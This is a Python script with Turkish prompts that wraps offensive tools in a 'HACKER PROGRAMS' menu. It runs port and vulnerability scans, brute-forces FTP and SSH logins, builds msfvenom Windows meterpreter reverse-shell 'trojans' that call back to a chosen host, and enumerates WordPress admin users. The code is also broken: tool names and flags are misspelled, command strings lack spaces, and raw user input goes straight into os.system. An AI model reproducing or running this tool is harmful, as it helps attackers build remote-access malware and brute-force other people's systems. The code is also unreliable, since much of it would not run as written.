import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet HACKER PROGRAMS")
print("\n---------All Programs Are Here!---------")
print("1-)Zaafiyet Analizi\n2-)Port Tarama\n3-)Exploit Arama\n4-)Güvenlik Duvarı Tespit\n5-)Kaba Kuvvet\n6-)RootKit Tarama\n7-)Trojan Oluşturma\n8-)Wordlst Oluşturma\n9-)WordPress\n10-)Derleme Aracı\n11-)VPN Kontrol")
menusecim=input("\nPlease Choise An Options! : ")
if(menusecim=="1"):
  os.system("clear")
  os.system("figlet Zaafiyet Analizi")
  hedefip=input("Hedef İp Giriniz: ")
  os.system("nikto -h" + hedefip)
  istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
  if(istek=="y"):
     os.system("python3 HackerPrograms.py") 
     menusecim==1 
  elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
  else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")
elif(menusecim=="2"):
  os.system("clear")
  os.system("figlet Port Tarama")
  print("\n1-)Hızlı Tarama\n2-)Servis Ve Versiyon Bilgisi\n3-)İşletim Sistemi Bilgisi")
  portislem=input("İşlem Numarasını Giriniz: ")
  if(portislem=="1"):
    hedefip=input("Hedef İp Giriniz: ")
    os.system("nmap " + hedefip)
  elif(portislem=="2"):
    hedefip=input("Hedef İp Giriniz: ")
    os.system("nmap -0 " + hedefip)
  elif(portislem=="3"):
    hedefip=input("Hedef İp Giriniz: ")
    os.system("nmap -0 "+hedefip)
  else:
    print("Hatalı Seçim Yaptınız")
  istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
  if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
  elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
  else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")      
elif(menusecim=="3"):
   os.system("clear")
   os.system("figlet Exploit Arama")
   anahtarkelime=input("\nAnahtar Kelime Giriniz: ")
   os.system("searchsloit "+anahtarkelime)
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")    
elif(menusecim=="4"):
   os.system("clear")
   os.system("figlet Güvenlik Duvarı Tespit")
   site=input("Site Adresini Giriniz:")
   os.system("wafw00f"+site)
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")
elif(menusecim=="5"):
   os.system("clear")
   os.system("figlet Kaba Kuvvet")
   print("1-)FTP\n2-)SSH\n3-)Telnet\n4-)SMB\n5-)ROB\n6-)SIP\n7-)Redis\n8-)VNc\n9-)PostgreSQL\n10-)MySQL")
   secim=input("İşlem Numarası Giriniz: ")
   
   if(secim=="1"):
     hedefip=input("Hedef İp Giriniz")
     kullaniciadi=input("Kullanıcı Adı Dosya Yolu: ")
     sifre=input("sifrelerin Bulunduğu Dosya Yolu: ")
     os.system("nrack -p 21 -u " + kullaniciadi + " -p" + sifre + " " + hedefip)
   elif(secim=="2"):
     hedefip=input("Hedef İp Giriniz")
     kullaniciadi=input("Kullanıcı Adı Dosya Yolu: ")
     sifre=input("sifrelerin Bulunduğu Dosya Yolu: ")
     os.system("nrack -p 22 -u " + kullaniciadi + " -p" + sifre + " " + hedefip)
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")
elif(menusecim=="6"):
   os.system("clear")
   os.system("figlet RootKit Tarama")
   os.system("chrootkit")
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")
elif(menusecim=="7"):
   os.system("clear")
   os.system("figlet Trojan Oluşturma")   
   print("1-)windows/meterpreter/reverse_tcp\n2-)windows/meterpreter/reverse_http\n3-)windows/meterpreter/reverse_https")
   secim=input("Oluşturmak İstediğiniz Trojan Tipini Seçiniz")
   ip=input("Local Veya Dış İp Giriniz: ")
   port=input("Port Numarasını Giriniz: ")
   kayityeri=input("Kayıt Yerini Giriniz: ")
   if(secim=="1"):
     os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST = " + ip + "LPORT = " + port + "-f exe -o" + kayityeri)
   elif(secim=="2"):
     os.system("msfvenom -p windows/meterpreter/reverse_http LHOST = " + ip + "LPORT = " + port + "-f exe -o" + kayityeri)
   elif(secim=="3"):
     os.system("msfvenom -p windows/meterpreter/reverse_https LHOST = " + ip + "LPORT = " + port + "-f exe -o" + kayityeri)
   else:
     print("Hatalı Seçim Yaptınız")
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")
elif(menusecim=="8"):
   os.system("clear")
   os.system("figlet Wordlist Oluşturma")
   minimum=input("En Kısa Uzunluğu Giriniz: ")
   maximum=input("En Uzun Uzunluğu Giriniz: ")
   karakter=input("Karakterleri Giriniz: ")
   kayityeri=input("Kayıt Yerini Giriniz: ")
   os.system("crunch" + minimum + " " + maximum + " " + karakter + " -o " + kayityeri) 
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")
elif(menusecim=="9"):
   os.system("clear")
   os.system("figlet WordPress")
   print("1-)Hızlı Tarama\n2-)Eklenti Tarama\n3-)Tema Tarama\n4-)Yönetici Kullanıcı Adı Tarama")
   secim=input("İşlem Numarasını Giriniz: ")
   if(secim=="1"):  
     site=input("Site Adresini Giriniz")
     os.system("wpnscan --url\ " + site)
   elif(secim=="2"):
     site=input("Site Adresini Giriniz")
     os.system("wpnscan --url\ " + site + " --enumerate p")
   elif(secim=="3"):
     site=input("site Adresini Giriniz")
     os.system("wpnscan --url\ " + site + " --enumerate t")
   elif(secim=="4"):
     site=input("Site Adresini Giriniz")
     os.system("wpnscan --url\ " + site + " --enumerate u")
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")       
elif(menusecim=="10"):
   os.system("clear")
   os.system("figlet Derleme Aracı")
   derle=input("Programın Adını Girinz: ")
   py_compile.compile("derle")
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor")
elif(menusecim=="11"):      
   os.system("clear")
   os.system("figlet Vpn Kontrol")
   hedefip=input("Hedef İp Giriniz")
   os.system("ike-scan " + hedefip)
   istek=input("Programı Yeniden Başlatmak İster Misiniz ? (y/n) : ")
   if(istek=="y"):
     os.system("python3 HackerPrograms.py")  
   elif(istek=="n"):
     print("İyi Günler")
     os.system("exit")
   else:
     print("Hatalı Seçim Yaptınız Programdan Çıkılıyor") 